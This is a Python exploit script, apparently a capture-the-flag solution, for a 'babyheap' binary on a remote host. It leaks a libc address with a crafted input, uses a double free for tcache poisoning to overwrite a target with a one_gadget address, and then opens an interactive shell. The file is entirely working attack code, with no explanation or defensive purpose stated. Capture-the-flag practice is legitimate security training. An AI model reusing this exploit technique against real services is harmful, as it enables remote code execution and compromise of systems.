from ptrlib import *

def add(size, data):
    sock.sendlineafter(">", "1")
    sock.sendlineafter(":", str(size))
    sock.sendlineafter(":", data)
    return
def show(index):
    sock.sendlineafter(">", "2")
    sock.sendlineafter(":", str(index))
    return sock.recvuntil("1. write")[:-8]
def delete(index):
    sock.sendlineafter(">", "3")
    sock.sendlineafter(":", str(index))
    return

libc = ELF("./libc.so.6")
#sock = Process("./babyheap")
sock = Socket("114.177.250.4", 2223)
libc_main_arena = 0x3ebc40
target = 0x619f60
one_gadget = 0xe569f

# libc leak
payload = b'2 516' # 0x204 = 516
payload += b' ' * (0x10 - len(payload))
payload += p64(0x602031)
sock.sendlineafter(">", payload)
sock.recvuntil(":")
libc_base = (u64(sock.recv(5)) - (libc.symbol('puts') >> 8)) << 8
logger.info("libc = " + hex(libc_base))
sock.recvuntil(">")

# tcache poisoning
delete(0)
delete(0)
add(0x18, p64(libc_base + target))
add(0x18, "dummy")
add(0x18, p64(libc_base + one_gadget))

sock.interactive()
